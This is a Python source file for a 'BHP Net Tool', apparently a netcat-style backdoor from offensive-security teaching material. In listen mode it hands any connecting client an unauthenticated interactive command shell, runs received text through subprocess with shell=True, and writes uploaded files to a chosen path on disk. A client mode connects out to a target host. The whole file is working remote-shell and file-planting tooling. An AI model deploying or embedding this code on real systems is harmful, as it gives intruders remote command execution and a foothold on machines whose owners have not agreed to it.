#!/usr/bin/env python
# -*-coding = utf-8-*-

import sys
import socket
import threading
import subprocess
import argparse

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    parser = argparse.ArgumentParser(description="BHP Net Tool")
    parser.add_argument("-t", "--target", help="the ip or domain of target", default="0.0.0.0")
    parser.add_argument("-p", "--port", help="the port of ftp", default=0)
    parser.add_argument("-l", "--listen", action="store_true", help="listen on [host]:[port] for incoming connections")
    parser.add_argument("-e", "--execute", help="execute the given file upon receiving a connection")
    parser.add_argument("-c", "--command", action="store_true", help='initialize a command shell')
    parser.add_argument("-u", "--upload", help="upon receiving connection upload a file and write to [destination]")
    args = parser.parse_args()

    listen = args.listen
    command = args.command
    target = args.target
    port = int(args.port)
    if args.upload:
        upload_destination = args.upload
    if args.execute:
        execute = args.execute

    if listen:
        server_loop()
    elif port > 0:
        _buffer = sys.stdin.read()
        client_sender(_buffer)
    else:
        print("[*]noting to do")


def client_sender(_buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        if len(_buffer):
            client.send(_buffer)
        while True:
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
            print(response)
            _buffer = raw_input("> ")
            _buffer += "\n"
            client.send(_buffer)
    except Exception as e:
        print(e)
        print("[*] Exception! Exiting.")
        client.close()


def server_loop():
    global target
    global port

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
    print("[*] start BHP server [{}:{}]!".format(target, port))
    while True:
        client_socket, addr = server.accept()

        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def run_command(_command):
    _command = _command.rstrip()

    try:
        output = subprocess.check_output(_command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"

    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    print('[-] get a connect!')
    if len(upload_destination):
        file_buffer = ""

        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    if command:
        while True:
            client_socket.send("<BHP:#> ")
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            response = run_command(cmd_buffer)
            client_socket.send(response)


if __name__ == "__main__":
    main()


